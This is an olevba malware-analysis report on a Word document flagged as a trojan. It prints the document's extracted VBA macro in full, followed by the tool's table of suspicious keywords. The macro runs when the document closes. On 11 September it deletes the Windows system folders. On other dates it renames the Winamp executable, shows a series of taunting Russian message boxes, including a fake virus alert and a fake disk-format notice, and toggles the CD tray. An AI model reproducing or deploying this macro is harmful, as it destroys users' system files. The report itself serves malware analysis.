olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.KillFiles.a-b22392f48295adea475d9cc205f46036fdfa1a6a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.KillFiles.a-b22392f48295adea475d9cc205f46036fdfa1a6a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Trojan.MSWord.KillFiles.a-b22392f48295adea475d9cc205f46036fdfa1a6a - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Declare Function mciSendString Lib "winmm.dll" _
Alias "mciSendStringA" (ByVal lpstrCommand As String, _
ByVal lpstrReturnString As String, ByVal uReturnLength As Long, _
ByVal hwndCallback As Long) As Long
Sub autoclose()
On Error Resume Next
If Month(Now()) = 9 And Day(Now()) = 11 Then
Kill "C:\WINDOWS\*.*"
Kill "C:\WINDOWS\system32\*.*"
Kill "C:\WINDOWS\system\*.*"
MsgBox "-------НЕУДАЧНЫЙ ДЕНЬ--------", vbCritical, "GAME OVER"
Else
If Month(Now()) = Day(Now()) Then
OldName = "C:\Program Files\Winamp\winamp.exe"
NewName = "C:\Program Files\Winamp\winamp.dll"
Name OldName As NewName
MsgBox "       Невожможно закрыть Microsoft Word     ", vbCritical, "Error"
MsgBox "       WARNING!!!   Virus Alert              ", vbExclamation
MsgBox "       Обнаружен вирус Trojan.Apokalipse.990eERR", vbCritical
MsgBox "       RSXCЪХЪЖХ}>}{}::P_p][p-BHG}{LPJBG(&*(&%*(*&^)UgyuFRCHGVFMPK)J?>HYt"
MsgBox "       Hi, Lamer !!! }:}:>}:L{>{:}{:|}:}{L{LLL}L}", 0, "For Lamer"
MsgBox "       My Name is Debuger                ", vbInformation, "Debuger"
MsgBox "       Хочешь закрыть Word???            ", 4, "Debuger"
MsgBox "       Чего мучаешся, Hacker галимый @@@@@@@@@@@@@@@@@@@@@@@@____________", 5, "Debuger"
MsgBox "       Я вижу у  тебя винда нелицензионная (:(:(:(:(:(:(:(:(:(:          ", 0, "Debuger"
MsgBox "............и проги пиратские............................................", 0, "Debuger"
MsgBox "       Да ты ещё музло бесплатно слушаешьХХХХХХХХХХХХХХХХХХХХХХХХХХХХХХХХ", o, "Debuger"
MsgBox "       ПИРАТСТВУ------------БОЙ!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!          ", 3, "Debuger"
MsgBox "       Сколько можно жать ОК?][;]=;];=[;.]l;][;];]                       ", vbQuestion, "Debuger"
MsgBox "       ];]=90=9   На компе много ДЕРЬМА                                  ", vbExclamation, "Debuger"
MsgBox "+++++++Gih Прочистим мозги", 2, "Debuger"
MsgBox " gvycgdevccvvuebvfuvcbidcdhcvhjfbdfverbvhdfbvkfbvierbvhbvjkdfvnoerghuerionvfjkefvyuidfubvdfjvnuifbvkdfbvdkfvnonflvncjkfvnjkfdbvjkdfbvkdfjvnfjvbkjbvuivnuiervervyucvrycbicvyurcbuecvrcbuybcirbibvfiriebvuerbvierburbvuierncvruifnuierbfverubfveruobvierbvfuirvnuirencvoeruveruibverbvurbuirnfvornfvoerbvroebvoerbviorbvioerbvfiorbvoribvoribvfrobvrbviorebfriwebfrobvfrebvernvriovfnerofnvgeriogeyfrfjriofhuierfhукенг4ен45гео5щзеш9045негш5рагшпнгкацалукпаклалдукрпгшуимукмшщутмзщукмлщзукаомщзукпошщукрпущкпвсмцуенчмцугчмцугтчшцусишцусишцувшщцумаецумвуоварукаьпармкукрпгшукткщмьакрскнцаицукаиукшциаукшипвасросикрсммаируксмтииамрамолватмолпаимгпруеимшимолмтолпаимитмшваипмним ариммишимраимимримримароимримрогаимроваимроимимрваимроаимроваимолваимроваимимроимроваимроиамроваимроаимроваимрмуаолмтшщукатукшщмукгшимугпампасвфывпрчсфыачмвпрсмвмсгуисукиаукцрсиукгисуксиксиушксишксткрмпапмсгкцумснгксмцукгисрогцукисукрсикотсшцукрсицукгсикимасисшцкиксмукрцсикшцурукимааиксишцуксиукгсиушкроимаугшмикущмукшщиммщуктмщ", vbCritical, "Debuger"
MsgBox "тЫ мНе НаДоЕл", 3, "Debuger"
MsgBox "___________________________________________________И комп у тебя отстой____________________________________", o, "Debuger"
MsgBox " Пока ты фигнёй страдал твоё пиратское Гавно смылось в Унитаз", vbInformation, "Debuger"
MsgBox "                             URA!!!    URA!!!     URA!!!                                                   ", 0, "Debuger"
MsgBox "NJ    тО ЛИ ещё будет///////////////////////////////", 2, "Debuger"
MsgBox "----ХОРОШИЙ ВИНТ-ЧИСТЫЙ ВИНТ----", vbCritical, "Format\: C"
MsgBox " Ну вот и началось самое Интересное", vbInformation, "Debuger"
Else
MsgBox "       Невожможно закрыть Microsoft Word     ", vbCritical, "Error"
MsgBox "       WARNING!!!   Virus Alert              ", vbExclamation
MsgBox "       Обнаружен вирус Trojan.Apokalipse.990eERR", vbCritical
MsgBox "       RSXCЪХЪЖХ}>}{}::P_p][p-BHG}{LPJBG(&*(&%*(*&^)UgyuFRCHGVFMPK)J?>HYt"
MsgBox "       Hi, Lamer !!! }:}:>}:L{>{:}{:|}:}{L{LLL}L}", 0, "For Lamer"
MsgBox "       My Name is Debuger                ", vbInformation, "Debuger"
MsgBox "       Хочешь закрыть Word???            ", 4, "Debuger"
MsgBox "       Чего мучаешся, Hacker галимый @@@@@@@@@@@@@@@@@@@@@@@@____________", 5, "Debuger"
MsgBox "       Я вижу у  тебя винда нелицензионная (:(:(:(:(:(:(:(:(:(:          ", 0, "Debuger"
MsgBox "............и проги пиратские............................................", 0, "Debuger"
MsgBox "       Да ты ещё музло бесплатно слушаешьХХХХХХХХХХХХХХХХХХХХХХХХХХХХХХХХ", o, "Debuger"
MsgBox "       ПИРАТСТВУ------------БОЙ!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!          ", 3, "Debuger"
MsgBox "       Сколько можно жать ОК?][;]=;];=[;.]l;][;];]                       ", vbQuestion, "Debuger"
MsgBox "       ];]=90=9   На компе много ДЕРЬМА                                  ", vbExclamation, "Debuger"
MsgBox "+++++++Gih Прочистим мозги", 2, "Debuger"
MsgBox " gvycgdevccvvuebvfuvcbidcdhcvhjfbdfverbvhdfbvkfbvierbvhbvjkdfvnoerghuerionvfjkefvyuidfubvdfjvnuifbvkdfbvdkfvnonflvncjkfvnjkfdbvjkdfbvkdfjvnfjvbkjbvuivnuiervervyucvrycbicvyurcbuecvrcbuybcirbibvfiriebvuerbvierburbvuierncvruifnuierbfverubfveruobvierbvfuirvnuirencvoeruveruibverbvurbuirnfvornfvoerbvroebvoerbviorbvioerbvfiorbvoribvoribvfrobvrbviorebfriwebfrobvfrebvernvriovfnerofnvgeriogeyfrfjriofhuierfhукенг4ен45гео5щзеш9045негш5рагшпнгкацалукпаклалдукрпгшуимукмшщутмзщукмлщзукаомщзукпошщукрпущкпвсмцуенчмцугчмцугтчшцусишцусишцувшщцумаецумвуоварукаьпармкукрпгшукткщмьакрскнцаицукаиукшциаукшипвасросикрсммаируксмтииамрамолватмолпаимгпруеимшимолмтолпаимитмшваипмним ариммишимраимимримримароимримрогаимроваимроимимрваимроаимроваимолваимроваимимроимроваимроиамроваимроаимроваимрмуаолмтшщукатукшщмукгшимугпампасвфывпрчсфыачмвпрсмвмсгуисукиаукцрсиукгисуксиксиушксишксткрмпапмсгкцумснгксмцукгисрогцукисукрсикотсшцукрсицукгсикимасисшцкиксмукрцсикшцурукимааиксишцуксиукгсиушкроимаугшмикущмукшщиммщуктмщ", vbCritical, "Debuger"
MsgBox "тЫ мНе НаДоЕл", 3, "Debuger"
MsgBox "___________________________________________________И комп у тебя отстой____________________________________", o, "Debuger"
MsgBox " Пока ты фигнёй страдал твоё пиратское Гавно смылось в Унитаз", vbInformation, "Debuger"
MsgBox "                             URA!!!    URA!!!     URA!!!                                                   ", 0, "Debuger"
MsgBox "NJ    тО ЛИ ещё будет///////////////////////////////", 2, "Debuger"
mciSendString "Set cdaudio door open wait", 0, 0, 0
mciSendString "Set cdaudio door closed wait", 0, 0, 0
MsgBox "----ХОРОШИЙ ВИНТ-ЧИСТЫЙ ВИНТ----", vbCritical, "Format\: C"
mciSendString "Set cdaudio door open wait", 0, 0, 0
mciSendString "Set cdaudio door closed wait", 0, 0, 0
MsgBox " Ну вот и началось самое Интересное", vbInformation, "Debuger"
End If
End If
End Sub



 
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: Trojan.MSWord.KillFiles.a-b22392f48295adea475d9cc205f46036fdfa1a6a - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module11.bas 
in file: Trojan.MSWord.KillFiles.a-b22392f48295adea475d9cc205f46036fdfa1a6a - OLE stream: 'Macros/VBA/Module11'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Compare Text
Dim file As String
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoclose           |Runs when the Word document is closed        |
|Suspicious|open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|WINDOWS             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |winmm.dll           |Executable file name                         |
|IOC       |winamp.exe          |Executable file name                         |
|IOC       |winamp.dll          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

